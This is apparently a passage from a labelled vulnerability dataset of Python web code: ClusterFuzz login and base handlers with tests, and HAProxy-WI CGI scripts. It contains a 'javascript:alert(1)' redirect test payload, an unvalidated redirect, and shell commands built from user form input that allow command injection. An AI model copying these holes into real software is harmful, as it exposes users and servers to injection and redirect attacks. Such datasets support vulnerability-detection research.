 session_cookie = auth.create_session_cookie(id_token, expires_in)\n    except auth.AuthError:\n      raise helpers.EarlyExitException('Failed to create session cookie.', 401)\n\n    expires = datetime.datetime.now() + expires_in\n    self.response.set_cookie(\n        'session',\n        session_cookie,\n        expires=expires,\n        httponly=True,\n        secure=True,\n        overwrite=True)\n    self.render_json({'status': 'success'})\n\n\nclass LogoutHandler(base_handler.Handler):\n  \"\"\"Log out handler.\"\"\"\n\n  @handler.unsupported_on_local_server\n  @handler.require_csrf_token\n  @handler.get(handler.HTML)\n  def get(self):\n    \"\"\"Handle a get request.\"\"\"\n    try:\n      auth.revoke_session_cookie(auth.get_session_cookie())\n    except auth.AuthError:\n      # Even if the revoke failed, remove the cookie.\n      logs.log_error('Failed to revoke session cookie.')\n\n    self.response.delete_cookie('session')\n    self.redirect(self.request.get('dest'))\n/n/n/nsrc/python/tests/appengine/handlers/base_handler_test.py/n/n# Copyright 2019 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"Tests for the base handler class.\"\"\"\n\nimport unittest\nimport webapp2\nimport webtest\n\nfrom handlers import base_handler\nfrom libs import helpers\nfrom tests.test_libs import helpers as test_helpers\n\n\nclass JsonHandler(base_handler.Handler):\n  \"\"\"Render JSON response for testing.\"\"\"\n\n  def get(self):\n    self.render_json({'test': 'value'})\n\n\nclass HtmlHandler(base_handler.Handler):\n  \"\"\"Render HTML response for testing.\"\"\"\n\n  def get(self):\n    self.render('test.html', {'test': 'value'})\n\n\nclass ExceptionJsonHandler(base_handler.Handler):\n  \"\"\"Render exception in JSON response for testing.\"\"\"\n\n  def get(self):\n    self.response.headers['Content-Type'] = 'application/json'\n    raise Exception('message')\n\n\nclass ExceptionHtmlHandler(base_handler.Handler):\n  \"\"\"Render exception in HTML response for testing.\"\"\"\n\n  def get(self):\n    raise Exception('unique_message')\n\n\nclass EarlyExceptionHandler(base_handler.Handler):\n  \"\"\"Render EarlyException in JSON for testing.\"\"\"\n\n  def get(self):\n    self.response.headers['Content-Type'] = 'application/json'\n    raise helpers.EarlyExitException('message', 500, [])\n\n\nclass AccessDeniedExceptionHandler(base_handler.Handler):\n  \"\"\"Render forbidden in HTML response for testing.\"\"\"\n\n  def get(self):\n    raise helpers.AccessDeniedException('this_random_message')\n\n\nclass RedirectHandler(base_handler.Handler):\n  \"\"\"Redirect handler.\"\"\"\n\n  def get(self):\n    redirect = self.request.get('redirect')\n    self.redirect(redirect)\n\n\nclass HandlerTest(unittest.TestCase):\n  \"\"\"Test Handler.\"\"\"\n\n  def setUp(self):\n    test_helpers.patch(self, [\n        'config.db_config.get_value',\n        'libs.form.generate_csrf_token',\n        'libs.helpers.get_user_email',\n    ])\n    self.mock.get_value.return_value = 'contact_string'\n    self.mock.generate_csrf_token.return_value = 'csrf_token'\n    self.mock.get_user_email.return_value = 'test@test.com'\n\n  def test_render_json(self):\n    \"\"\"Ensure it renders JSON correctly.\"\"\"\n    app = webtest.TestApp(webapp2.WSGIApplication([('/', JsonHandler)]))\n    response = app.get('/')\n    self.assertEqual(response.status_int, 200)\n    self.assertDictEqual(response.json, {'test': 'value'})\n\n  def test_render_early_exception(self):\n    \"\"\"Ensure it renders JSON response for EarlyExitException properly.\"\"\"\n    app = webtest.TestApp(\n        webapp2.WSGIApplication([('/', EarlyExceptionHandler)]))\n    response = app.get('/', expect_errors=True)\n    self.assertEqual(response.status_int, 500)\n    self.assertEqual(response.json['message'], 'message')\n    self.assertEqual(response.json['email'], 'test@test.com')\n\n  def test_render_json_exception(self):\n    \"\"\"Ensure it renders JSON exception correctly.\"\"\"\n    app = webtest.TestApp(\n        webapp2.WSGIApplication([('/', ExceptionJsonHandler)]))\n    response = app.get('/', expect_errors=True)\n    self.assertEqual(response.status_int, 500)\n    self.assertEqual(response.json['message'], 'message')\n    self.assertEqual(response.json['email'], 'test@test.com')\n\n  def test_render(self):\n    \"\"\"Ensure it gets template and render HTML correctly.\"\"\"\n    app = webtest.TestApp(webapp2.WSGIApplication([('/', HtmlHandler)]))\n    response = app.get('/')\n    self.assertEqual(response.status_int, 200)\n    self.assertEqual(response.body, '<html><body>value\\n</body></html>')\n\n  def test_render_html_exception(self):\n    \"\"\"Ensure it renders HTML exception correctly.\"\"\"\n    app = webtest.TestApp(\n        webapp2.WSGIApplication([('/', ExceptionHtmlHandler)]))\n    response = app.get('/', expect_errors=True)\n    self.assertEqual(response.status_int, 500)\n    self.assertRegexpMatches(response.body, '.*unique_message.*')\n    self.assertRegexpMatches(response.body, '.*test@test.com.*')\n\n  def test_forbidden_not_logged_in(self):\n    \"\"\"Ensure it renders forbidden response correctly (when not logged in).\"\"\"\n    self.mock.get_user_email.return_value = None\n\n    app = webtest.TestApp(\n        webapp2.WSGIApplication([('/', AccessDeniedExceptionHandler)]))\n    response = app.get('/', expect_errors=True)\n    self.assertEqual(response.status_int, 302)\n    self.assertEqual('http://localhost/login?dest=http%3A%2F%2Flocalhost%2F',\n                     response.headers['Location'])\n\n  def test_forbidden_logged_in(self):\n    \"\"\"Ensure it renders forbidden response correctly (when logged in).\"\"\"\n    app = webtest.TestApp(\n        webapp2.WSGIApplication([('/', AccessDeniedExceptionHandler)]))\n    response = app.get('/', expect_errors=True)\n    self.assertEqual(response.status_int, 403)\n    self.assertRegexpMatches(response.body, '.*Access Denied.*')\n    self.assertRegexpMatches(response.body, '.*this_random_message.*')\n\n  def test_redirect_another_page(self):\n    \"\"\"Test redirect to another page.\"\"\"\n    app = webtest.TestApp(webapp2.WSGIApplication([('/', RedirectHandler)]))\n    response = app.get('/?redirect=%2Fanother-page')\n    self.assertEqual('http://localhost/another-page',\n                     response.headers['Location'])\n\n  def test_redirect_another_domain(self):\n    \"\"\"Test redirect to another domain.\"\"\"\n    app = webtest.TestApp(webapp2.WSGIApplication([('/', RedirectHandler)]))\n    response = app.get('/?redirect=https%3A%2F%2Fblah.com%2Ftest')\n    self.assertEqual('https://blah.com/test', response.headers['Location'])\n\n  def test_redirect_javascript(self):\n    \"\"\"Test redirect to a javascript url.\"\"\"\n    app = webtest.TestApp(webapp2.WSGIApplication([('/', RedirectHandler)]))\n    response = app.get(\n        '/?redirect=javascript%3Aalert%281%29', expect_errors=True)\n    self.assertEqual(response.status_int, 403)\n/n/n/n", "label": 0}, {"id": "3d66c1146550eecd4e34d47332a8616b435a21fe", "code": "/src/appengine/handlers/base_handler.py/n/n# Copyright 2019 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"The superclass of all handlers.\"\"\"\n\nfrom builtins import object\nfrom future import standard_library\nstandard_library.install_aliases()\nimport base64\nimport cgi\nimport datetime\nimport json\nimport logging\nimport os\nimport re\nimport sys\nimport traceback\nimport urllib.parse\n\nimport jinja2\nimport webapp2\n\nfrom base import utils\nfrom config import db_config\nfrom config import local_config\nfrom datastore import ndb\nfrom google_cloud_utils import storage\nfrom libs import auth\nfrom libs import form\nfrom libs import helpers\nfrom system import environment\n\n\ndef add_jinja2_filter(name, fn):\n  _JINJA_ENVIRONMENT.filters[name] = fn\n\n\nclass JsonEncoder(json.JSONEncoder):\n  \"\"\"Json encoder.\"\"\"\n  _EPOCH = datetime.datetime.utcfromtimestamp(0)\n\n  def default(self, obj):  # pylint: disable=arguments-differ,method-hidden\n    if isinstance(obj, ndb.Model):\n      dict_obj = obj.to_dict()\n      dict_obj['id'] = obj.key.id()\n      return dict_obj\n    elif isinstance(obj, datetime.datetime):\n      return int((obj - self._EPOCH).total_seconds())\n    elif hasattr(obj, 'to_dict'):\n      return obj.to_dict()\n    elif isinstance(obj, cgi.FieldStorage):\n      return str(obj)\n    else:\n      raise Exception('Cannot serialise %s' % obj)\n\n\ndef format_time(dt):\n  \"\"\"Format datetime object for display.\"\"\"\n  return '{t.day} {t:%b} {t:%y} {t:%X} PDT'.format(t=dt)\n\n\ndef splitlines(text):\n  \"\"\"Split text into lines.\"\"\"\n  return text.splitlines()\n\n\ndef split_br(text):\n  return re.split(r'\\s*<br */>\\s*', text, flags=re.IGNORECASE)\n\n\ndef encode_json(value):\n  \"\"\"Dump base64-encoded JSON string (to avoid XSS).\"\"\"\n  return base64.b64encode(json.dumps(value, cls=JsonEncoder))\n\n\n_JINJA_ENVIRONMENT = jinja2.Environment(\n    loader=jinja2.FileSystemLoader(\n        os.path.join(os.path.dirname(__file__), '..', 'templates')),\n    extensions=['jinja2.ext.autoescape'],\n    autoescape=True)\n_MENU_ITEMS = []\n\nadd_jinja2_filter('json', encode_json)\nadd_jinja2_filter('format_time', format_time)\nadd_jinja2_filter('splitlines', splitlines)\nadd_jinja2_filter('split_br', split_br)\nadd_jinja2_filter('polymer_tag', lambda v: '{{%s}}' % v)\n\n\ndef add_menu(name, href):\n  \"\"\"Add menu item to the main navigation.\"\"\"\n  _MENU_ITEMS.append(_MenuItem(name, href))\n\n\ndef make_login_url(dest_url):\n  \"\"\"Make the switch account url.\"\"\"\n  return '/login?' + urllib.parse.urlencode({'dest': dest_url})\n\n\ndef make_logout_url(dest_url):\n  \"\"\"Make the switch account url.\"\"\"\n  return '/logout?' + urllib.parse.urlencode({\n      'csrf_token': form.generate_csrf_token(),\n      'dest': dest_url,\n  })\n\n\nclass _MenuItem(object):\n  \"\"\"A menu item used for rendering an item in the main navigation.\"\"\"\n\n  def __init__(self, name, href):\n    self.name = name\n    self.href = href\n\n\nclass Handler(webapp2.RequestHandler):\n  \"\"\"A superclass for all handlers. It contains many convenient methods.\"\"\"\n\n  def is_cron(self):\n    \"\"\"Return true if the request is from a cron job.\"\"\"\n    return bool(self.request.headers.get('X-Appengine-Cron'))\n\n  def render_forbidden(self, message):\n    \"\"\"Write HTML response for 403.\"\"\"\n    login_url = make_login_url(dest_url=self.request.url)\n    user_email = helpers.get_user_email()\n    if not user_email:\n      self.redirect(login_url)\n      return\n\n    contact_string = db_config.get_value('contact_string')\n    template_values = {\n        'message': message,\n        'user_email': helpers.get_user_email(),\n        'login_url': login_url,\n        'switch_account_url': login_url,\n        'logout_url': make_logout_url(dest_url=self.request.url),\n        'contact_string': contact_string,\n    }\n    self.render('error-403.html', template_values, 403)\n\n  def _add_security_response_headers(self):\n    \"\"\"Add security-related headers to response.\"\"\"\n    self.response.headers['Strict-Transport-Security'] = (\n        'max-age=2592000; includeSubdomains')\n    self.response.headers['X-Content-Type-Options'] = 'nosniff'\n    self.response.headers['X-Frame-Options'] = 'deny'\n\n  def render(self, path, values=None, status=200):\n    \"\"\"Write HTML response.\"\"\"\n    if values is None:\n      values = {}\n\n    values['menu_items'] = _MENU_ITEMS\n    values['is_oss_fuzz'] = utils.is_oss_fuzz()\n    values['is_development'] = (\n        environment.is_running_on_app_engine_development())\n    values['is_logged_in'] = bool(helpers.get_user_email())\n\n    # Only track analytics for non-admin users.\n    values['ga_tracking_id'] = (\n        local_config.GAEConfig().get('ga_tracking_id')\n        if not auth.is_current_user_admin() else None)\n\n    if values['is_logged_in']:\n      values['switch_account_url'] = make_login_url(self.request.url)\n      values['logout_url'] = make_logout_url(dest_url=self.request.url)\n\n    template = _JINJA_ENVIRONMENT.get_template(path)\n\n    self._add_security_response_headers()\n    self.response.headers['Content-Type'] = 'text/html'\n    self.response.out.write(template.render(values))\n    self.response.set_status(status)\n\n  def before_render_json(self, values, status):\n    \"\"\"A hook for modifying values before render_json.\"\"\"\n\n  def render_json(self, values, status=200):\n    \"\"\"Write JSON response.\"\"\"\n    self._add_security_response_headers()\n    self.response.headers['Content-Type'] = 'application/json'\n    self.before_render_json(values, status)\n    self.response.out.write(json.dumps(values, cls=JsonEncoder))\n    self.response.set_status(status)\n\n  def handle_exception(self, exception, _):\n    \"\"\"Catch exception and format it properly.\"\"\"\n    try:\n\n      status = 500\n      values = {\n          'message': exception.message,\n          'email': helpers.get_user_email(),\n          'traceDump': traceback.format_exc(),\n          'status': status,\n          'type': exception.__class__.__name__\n      }\n      if isinstance(exception, helpers.EarlyExitException):\n        status = exception.status\n        values = exception.to_dict()\n      values['params'] = self.request.params.dict_of_lists()\n\n      # 4XX is not our fault. Therefore, we hide the trace dump and log on\n      # the INFO level.\n      if status >= 400 and status <= 499:\n        logging.info(json.dumps(values, cls=JsonEncoder))\n        del values['traceDump']\n      else:  # Other error codes should be logged with the EXCEPTION level.\n        logging.exception(exception)\n\n      if helpers.should_render_json(\n          self.request.headers.get('accept', ''),\n          self.response.headers.get('Content-Type')):\n        self.render_json(values, status)\n      else:\n        if status == 403 or status == 401:\n          self.render_forbidden(exception.message)\n        else:\n          self.render('error.html', values, status)\n    except Exception:\n      self.handle_exception_exception()\n\n  def handle_exception_exception(self):\n    \"\"\"Catch exception in handle_exception and format it properly.\"\"\"\n    exception = sys.exc_info()[1]\n    values = {'message': exception.message, 'traceDump': traceback.format_exc()}\n    logging.exception(exception)\n    if helpers.should_render_json(\n        self.request.headers.get('accept', ''),\n        self.response.headers.get('Content-Type')):\n      self.render_json(values, 500)\n    else:\n      self.render('error.html', values, 500)\n\n  def redirect(self, url, **kwargs):\n    \"\"\"Explicitly converts url to 'str', because webapp2.RequestHandler.redirect\n    strongly requires 'str' but url might be an unicode string.\"\"\"\n    super(Handler, self).redirect(str(url), **kwargs)\n\n\nclass GcsUploadHandler(Handler):\n  \"\"\"A handler which uploads files to GCS.\"\"\"\n\n  def __init__(self, request, response):\n    self.initialize(request, response)\n    self.upload = None\n\n  def get_upload(self):\n    \"\"\"Get uploads.\"\"\"\n    if self.upload:\n      return self.upload\n\n    upload_key = self.request.get('upload_key')\n    if not upload_key:\n      return None\n\n    blob_info = storage.GcsBlobInfo.from_key(upload_key)\n    if not blob_info:\n      raise helpers.EarlyExitException('Failed to upload.', 500)\n\n    self.upload = blob_info\n    return self.upload\n/n/n/n/src/appengine/handlers/login.py/n/n# Copyright 2019 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"Login page.\"\"\"\n\nimport datetime\n\nfrom config import local_config\nfrom handlers import base_handler\nfrom libs import auth\nfrom libs import handler\nfrom libs import helpers\nfrom metrics import logs\n\nSESSION_EXPIRY_DAYS = 14\n\n\nclass Handler(base_handler.Handler):\n  \"\"\"Login page.\"\"\"\n\n  @handler.unsupported_on_local_server\n  @handler.get(handler.HTML)\n  def get(self):\n    \"\"\"Handle a get request.\"\"\"\n    self.render(\n        'login.html', {\n            'apiKey': local_config.ProjectConfig().get('firebase.api_key'),\n            'authDomain': auth.auth_domain(),\n            'dest': self.request.get('dest'),\n        })\n\n\nclass SessionLoginHandler(base_handler.Handler):\n  \"\"\"Session login handler.\"\"\"\n\n  @handler.post(handler.JSON, handler.JSON)\n  def post(self):\n    \"\"\"Handle a post request.\"\"\"\n    id_token = self.request.get('idToken')\n    expires_in = datetime.timedelta(days=SESSION_EXPIRY_DAYS)\n    try:\n      session_cookie = auth.create_session_cookie(id_token, expires_in)\n    except auth.AuthError:\n      raise helpers.EarlyExitException('Failed to create session cookie.', 401)\n\n    expires = datetime.datetime.now() + expires_in\n    self.response.set_cookie(\n        'session',\n        session_cookie,\n        expires=expires,\n        httponly=True,\n        secure=True,\n        overwrite=True)\n    self.render_json({'status': 'success'})\n\n\nclass LogoutHandler(base_handler.Handler):\n  \"\"\"Log out handler.\"\"\"\n\n  @handler.unsupported_on_local_server\n  @handler.require_csrf_token\n  @handler.get(handler.HTML)\n  def get(self):\n    \"\"\"Handle a get request.\"\"\"\n    try:\n      auth.revoke_session_cookie(auth.get_session_cookie())\n    except auth.AuthError:\n      # Even if the revoke failed, remove the cookie.\n      logs.log_error('Failed to revoke session cookie.')\n\n    self.response.delete_cookie('session')\n    self.redirect(self.request.get('dest'))\n/n/n/n", "label": 1}, {"id": "ba79e7301c5574b91b719298c56fd5129c46cca3", "code": "app/config.py/n/n#!/usr/bin/env python3\nimport cgi\nimport os\nimport http.cookies\nimport funct\nimport sql\nfrom jinja2 import Environment, FileSystemLoader\nenv = Environment(loader=FileSystemLoader('templates/'), autoescape=True)\ntemplate = env.get_template('config.html')\n\nprint('Content-type: text/html\\n')\nfunct.check_login()\n\nform = cgi.FieldStorage()\nserv = form.getvalue('serv')\nconfig_read = \"\"\ncfg = \"\"\nstderr = \"\"\nerror = \"\"\naftersave = \"\"\n\ntry:\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\n\tuser = sql.get_user_name_by_uuid(user_id.value)\n\tservers = sql.get_dick_permit()\n\ttoken = sql.get_token(user_id.value)\n\trole = sql.get_user_role_by_uuid(user_id.value)\nexcept:\n\tpass\n\nhap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')\n\nif serv is not None:\n\tcfg = hap_configs_dir + serv + \"-\" + funct.get_data('config') + \".cfg\"\n\nif serv is not None and form.getvalue('open') is not None :\n\t\n\ttry:\n\t\tfunct.logging(serv, \"config.py open config\")\n\texcept:\n\t\tpass\n\t\n\terror = funct.get_config(serv, cfg)\n\t\n\ttry:\n\t\tconf = open(cfg, \"r\")\n\t\tconfig_read = conf.read()\n\t\tconf.close\n\texcept IOError:\n\t\terror += '<br />Can\\'t read import config file'\n\n\tos.system(\"/bin/mv %s %s.old\" % (cfg, cfg))\t\n\nif serv is not None and form.getvalue('config') is not None:\n\ttry:\n\t\tfunct.logging(serv, \"config.py edited config\")\n\texcept:\n\t\tpass\n\t\t\n\tconfig = form.getvalue('config')\n\toldcfg = form.getvalue('oldconfig')\n\tsave = form.getvalue('save')\n\taftersave = 1\n\ttry:\n\t\twith open(cfg, \"a\") as conf:\n\t\t\tconf.write(config)\n\texcept IOError:\n\t\terror = \"Can't read import config file\"\n\t\n\tMASTERS = sql.is_master(serv)\n\tfor master in MASTERS:\n\t\tif master[0] != None:\n\t\t\tfunct.upload_and_restart(master[0], cfg, just_save=save)\n\t\t\n\tstderr = funct.upload_and_restart(serv, cfg, just_save=save)\n\t\t\n\tfunct.diff_config(oldcfg, cfg)\n\t\n\t#if save:\n\t#\tc = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\t#\tc[\"restart\"] = form.getvalue('serv')\n\t#\tprint(c)\n\t\t\n\tos.system(\"/bin/rm -f \" + hap_configs_dir + \"*.old\")\n\n\ntemplate = template.render(h2 = 1, title = \"Working with HAProxy configs\",\n\t\t\t\t\t\t\trole = role,\n\t\t\t\t\t\t\taction = \"config.py\",\n\t\t\t\t\t\t\tuser = user,\n\t\t\t\t\t\t\tselect_id = \"serv\",\n\t\t\t\t\t\t\tserv = serv,\n\t\t\t\t\t\t\taftersave = aftersave,\n\t\t\t\t\t\t\tconfig = config_read,\n\t\t\t\t\t\t\tcfg = cfg,\n\t\t\t\t\t\t\tselects = servers,\n\t\t\t\t\t\t\tstderr = stderr,\n\t\t\t\t\t\t\terror = error,\n\t\t\t\t\t\t\tnote = 1,\n\t\t\t\t\t\t\ttoken = token)\nprint(template)/n/n/napp/funct.py/n/n# -*- coding: utf-8 -*-\"\nimport cgi\nimport os, sys\n\nform = cgi.FieldStorage()\nserv = form.getvalue('serv')\n\ndef get_app_dir():\n\td = sys.path[0]\n\td = d.split('/')[-1]\t\t\n\treturn sys.path[0] if d == \"app\" else os.path.dirname(sys.path[0])\t\n\ndef get_config_var(sec, var):\n\tfrom configparser import ConfigParser, ExtendedInterpolation\n\ttry:\n\t\tpath_config = get_app_dir()+\"/haproxy-wi.cfg\"\n\t\tconfig = ConfigParser(interpolation=ExtendedInterpolation())\n\t\tconfig.read(path_config)\n\texcept:\n\t\tprint('Content-type: text/html\\n')\n\t\tprint('<center><div class=\"alert alert-danger\">Check the config file, whether it exists and the path. Must be: app/haproxy-webintarface.config</div>')\n\ttry:\n\t\treturn config.get(sec, var)\n\texcept:\n\t\tprint('Content-type: text/html\\n')\n\t\tprint('<center><div class=\"alert alert-danger\">Check the config file. Presence section %s and parameter %s</div>' % (sec, var))\n\t\t\t\t\t\ndef get_data(type):\n\tfrom datetime import datetime\n\tfrom pytz import timezone\n\timport sql\n\tnow_utc = datetime.now(timezone(sql.get_setting('time_zone')))\n\tif type == 'config':\n\t\tfmt = \"%Y-%m-%d.%H:%M:%S\"\n\tif type == 'logs':\n\t\tfmt = '%Y%m%d'\n\tif type == \"date_in_log\":\n\t\tfmt = \"%b %d %H:%M:%S\"\n\t\t\n\treturn now_utc.strftime(fmt)\n\t\t\t\ndef logging(serv, action, **kwargs):\n\timport sql\n\timport http.cookies\n\tlog_path = get_config_var('main', 'log_path')\n\tlogin = ''\n\t\n\tif not os.path.exists(log_path):\n\t\tos.makedirs(log_path)\n\t\t\n\ttry:\n\t\tIP = cgi.escape(os.environ[\"REMOTE_ADDR\"])\n\t\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\t\tuser_uuid = cookie.get('uuid')\n\t\tlogin = sql.get_user_name_by_uuid(user_uuid.value)\n\texcept:\n\t\tpass\n\t\t\n\tif kwargs.get('alerting') == 1:\n\t\tmess = get_data('date_in_log') + action + \"\\n\"\n\t\tlog = open(log_path + \"/checker-\"+get_data('logs')+\".log\", \"a\")\n\telif kwargs.get('metrics') == 1:\n\t\tmess = get_data('date_in_log') + action + \"\\n\"\n\t\tlog = open(log_path + \"/metrics-\"+get_data('logs')+\".log\", \"a\")\n\telif kwargs.get('keep_alive') == 1:\n\t\tmess = get_data('date_in_log') + action + \"\\n\"\n\t\tlog = open(log_path + \"/keep_alive-\"+get_data('logs')+\".log\", \"a\")\n\telse:\n\t\tmess = get_data('date_in_log') + \" from \" + IP + \" user: \" + login + \" \" + action + \" for: \" + serv + \"\\n\"\n\t\tlog = open(log_path + \"/config_edit-\"+get_data('logs')+\".log\", \"a\")\n\ttry:\t\n\t\tlog.write(mess)\n\t\tlog.close\n\texcept IOError as e:\n\t\tprint('<center><div class=\"alert alert-danger\">Can\\'t write log. Please check log_path in config %e</div></center>' % e)\n\t\tpass\n\t\ndef telegram_send_mess(mess, **kwargs):\n\timport telebot\n\tfrom telebot import apihelper\n\timport sql\n\t\n\ttelegrams = sql.get_telegram_by_ip(kwargs.get('ip'))\n\tproxy = sql.get_setting('proxy')\n\t\n\tfor telegram in telegrams:\n\t\ttoken_bot = telegram[1]\n\t\tchannel_name = telegram[2]\n\t\t\t\n\tif proxy is not None:\n\t\tapihelper.proxy = {'https': proxy}\n\ttry:\n\t\tbot = telebot.TeleBot(token=token_bot)\n\t\tbot.send_message(chat_id=channel_name, text=mess)\n\texcept:\n\t\tprint(\"Fatal: Can't send message. Add Telegram chanel before use alerting at this servers group\")\n\t\tsys.exit()\n\t\ndef check_login(**kwargs):\n\timport sql\n\timport http.cookies\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_uuid = cookie.get('uuid')\n\tref = os.environ.get(\"SCRIPT_NAME\")\n\n\tsql.delete_old_uuid()\n\t\n\tif user_uuid is not None:\n\t\tsql.update_last_act_user(user_uuid.value)\n\t\tif sql.get_user_name_by_uuid(user_uuid.value) is None:\n\t\t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref)\n\telse:\n\t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref)\n\t\t\t\t\ndef is_admin(**kwargs):\n\timport sql\n\timport http.cookies\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\n\ttry:\n\t\trole = sql.get_user_role_by_uuid(user_id.value)\n\texcept:\n\t\trole = 3\n\t\tpass\n\tlevel = kwargs.get(\"level\")\n\t\t\n\tif level is None:\n\t\tlevel = 1\n\t\t\n\ttry:\n\t\treturn True if role <= level else False\n\texcept:\n\t\treturn False\n\t\tpass\n\ndef page_for_admin(**kwargs):\n\tgive_level = 1\n\tgive_level = kwargs.get(\"level\")\n\t\t\n\tif not is_admin(level=give_level):\n\t\tprint('<center><h3 style=\"color: red\">How did you get here?! O_o You do not have need permissions</h>')\n\t\tprint('<meta http-equiv=\"refresh\" content=\"5; url=/\">')\n\t\timport sys\n\t\tsys.exit()\n\t\t\t\t\ndef ssh_connect(serv, **kwargs):\n\timport paramiko\n\tfrom paramiko import SSHClient\n\timport sql\n\tfullpath = get_config_var('main', 'fullpath')\n\tssh_enable = ''\n\tssh_port = ''\n\tssh_user_name = ''\n\tssh_user_password = ''\n\t\n\tfor sshs in sql.select_ssh(serv=serv):\n\t\tssh_enable = sshs[3]\n\t\tssh_user_name = sshs[4]\n\t\tssh_user_password = sshs[5]\n\t\tssh_key_name = fullpath+'/keys/%s.pem' % sshs[2]\n\n\tservers = sql.select_servers(server=serv)\n\tfor server in servers:\n\t\tssh_port = server[10]\n\n\tssh = SSHClient()\n\tssh.load_system_host_keys()\n\tssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n\ttry:\n\t\tif ssh_enable == 1:\n\t\t\tk = paramiko.RSAKey.from_private_key_file(ssh_key_name)\n\t\t\tssh.connect(hostname = serv, port =  ssh_port, username = ssh_user_name, pkey = k)\n\t\telse:\n\t\t\tssh.connect(hostname = serv, port =  ssh_port, username = ssh_user_name, password = ssh_user_password)\n\t\treturn ssh\n\texcept paramiko.AuthenticationException:\n\t\treturn 'Authentication failed, please verify your credentials'\n\t\tpass\n\texcept paramiko.SSHException as sshException:\n\t\treturn 'Unable to establish SSH connection: %s ' % sshException\n\t\tpass\n\texcept paramiko.BadHostKeyException as badHostKeyException:\n\t\treturn 'Unable to verify server\\'s host key: %s ' % badHostKeyException\n\t\tpass\n\texcept Exception as e:\n\t\tif e == \"No such file or directory\":\n\t\t\treturn '%s. Check ssh key' % e\n\t\t\tpass\n\t\telif e == \"Invalid argument\":\n\t\t\terror = 'Check the IP of the server'\n\t\t\tpass\n\t\telse:\n\t\t\terror = e\t\n\t\t\tpass\n\t\treturn str(error)\n\ndef get_config(serv, cfg, **kwargs):\n\timport sql\n\n\tconfig_path = \"/etc/keepalived/keepalived.conf\" if kwargs.get(\"keepalived\") else sql.get_setting('haproxy_config_path')\t\n\tssh = ssh_connect(serv)\n\ttry:\n\t\tsftp = ssh.open_sftp()\n\t\tsftp.get(config_path, cfg)\n\t\tsftp.close()\n\t\tssh.close()\n\texcept Exception as e:\n\t\tssh = str(e)\n\t\treturn ssh\n\t\ndef diff_config(oldcfg, cfg):\n\tlog_path = get_config_var('main', 'log_path')\n\tdiff = \"\"\n\tdate = get_data('date_in_log') \n\tcmd=\"/bin/diff -ub %s %s\" % (oldcfg, cfg)\n\t\n\toutput, stderr = subprocess_execute(cmd)\n\t\n\tfor line in output:\n\t\tdiff += date + \" \" + line + \"\\n\"\n\ttry:\t\t\n\t\tlog = open(log_path + \"/config_edit-\"+get_data('logs')+\".log\", \"a\")\n\t\tlog.write(diff)\n\t\tlog.close\n\texcept IOError:\n\t\tprint('<center><div class=\"alert alert-danger\">Can\\'t read write change to log. %s</div></center>' % stderr)\n\t\tpass\n\t\t\ndef install_haproxy(serv, **kwargs):\n\timport sql\n\tscript = \"install_haproxy.sh\"\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\thaproxy_sock_port = sql.get_setting('haproxy_sock_port')\n\tstats_port = sql.get_setting('stats_port')\n\tserver_state_file = sql.get_setting('server_state_file')\n\tstats_user = sql.get_setting('stats_user')\n\tstats_password = sql.get_setting('stats_password')\n\tproxy = sql.get_setting('proxy')\n\tos.system(\"cp scripts/%s .\" % script)\n\t\n\tproxy_serv = proxy if proxy is not None else \"\"\n\t\t\n\tcommands = [ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+\"/\"+script +\" PROXY=\" + proxy_serv+ \n\t\t\t\t\" SOCK_PORT=\"+haproxy_sock_port+\" STAT_PORT=\"+stats_port+\" STAT_FILE=\"+server_state_file+\n\t\t\t\t\" STATS_USER=\"+stats_user+\" STATS_PASS=\"+stats_password ]\n\t\n\terror = str(upload(serv, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\t\t\n\tos.system(\"rm -f %s\" % script)\n\tssh_command(serv, commands, print_out=\"1\")\n\t\n\tif kwargs.get('syn_flood') == \"1\":\n\t\tsyn_flood_protect(serv)\n\t\ndef syn_flood_protect(serv, **kwargs):\n\timport sql\n\tscript = \"syn_flood_protect.sh\"\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\t\n\tenable = \"disable\" if kwargs.get('enable') == \"0\" else \"disable\"\n\n\tos.system(\"cp scripts/%s .\" % script)\n\t\n\tcommands = [ \"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+ \" \"+enable ]\n\t\n\terror = str(upload(serv, tmp_config_path, script))\n\tif 